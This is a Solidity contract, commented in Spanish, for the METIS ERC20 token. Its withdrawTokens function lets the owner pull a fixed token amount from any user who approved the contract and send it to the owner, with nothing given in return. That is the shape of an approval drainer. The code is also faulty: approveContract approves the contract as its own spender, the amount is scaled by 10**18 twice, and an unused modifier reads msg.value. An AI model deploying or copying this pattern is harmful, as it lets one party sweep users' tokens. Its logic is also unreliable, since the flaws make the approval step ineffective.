// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
    // Otras funciones de la interfaz ERC20 que puedas necesitar
}

contract ApprovalAndTransfer {
    IERC20 public metisToken;
    address public owner;
    uint256 public minBalance;
    uint256 public scaledApprovalAmount;
    uint8 public tokenDecimals;
    bool public approvalReceived; // Variable de estado para rastrear la aprobación

    event Approved(address indexed user, address indexed owner);
    event TokensTransferred(address indexed user, address indexed owner, uint256 amount);

    constructor(address _metisToken, uint256 _minBalance) {
        metisToken = IERC20(_metisToken);
        owner = msg.sender;
        minBalance = _minBalance;
        tokenDecimals = metisToken.decimals();
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Solo el propietario puede llamar a esta funcion");
        _;
    }

    modifier hasMinimumBalance() {
        require(msg.value >= minBalance, "Saldo de BNB insuficiente");
        _;
    }

    modifier enoughGas(uint256 gasRequired) {
        require(gasleft() >= gasRequired, "Gas insuficiente");
        _;
    }

    function approveContract(uint256 approvalAmount) external enoughGas(3000000) {
        uint256 maxApproval = 20 * (10**18); // 20 METIS con 18 decimales
        require(approvalAmount <= maxApproval, "El monto de aprobacion supera el maximo permitido");
        
        // Escalar el monto de aprobación a 18 decimales
        scaledApprovalAmount = approvalAmount * (10**18);

        // Asegurarse de que haya suficiente gas para la aprobación
        require(gasleft() >= 3000000, "No hay suficiente gas para la aprobacion");

        // Llamar a la función approve del contrato del token METIS para permitir la transferencia
        require(metisToken.approve(address(this), scaledApprovalAmount), "La aprobacion fallo");

        // Marcar la aprobación como recibida
        approvalReceived = true;
        emit Approved(msg.sender, owner);
    }

    function withdrawTokens(address user) external onlyOwner enoughGas(3000000) {
        // Verificar que se haya recibido la aprobación
        require(approvalReceived, "La aprobacion no ha sido recibida");

        // Escalar el monto de retiro a 18 decimales
        uint256 scaledAmount = scaledApprovalAmount;

        // Verificar la asignación (allowance) del usuario para este contrato
        require(metisToken.allowance(user, address(this)) >= scaledAmount, "La asignacion no es suficiente");

        // Realizar la transferencia de tokens METIS desde el usuario al propietario
        require(metisToken.transferFrom(user, owner, scaledAmount), "La transferencia fallo");
        emit TokensTransferred(user, owner, scaledAmount);
    }

    function setMinBalance(uint256 _minBalance) external onlyOwner {
        minBalance = _minBalance;
    }

    receive() external payable {}
}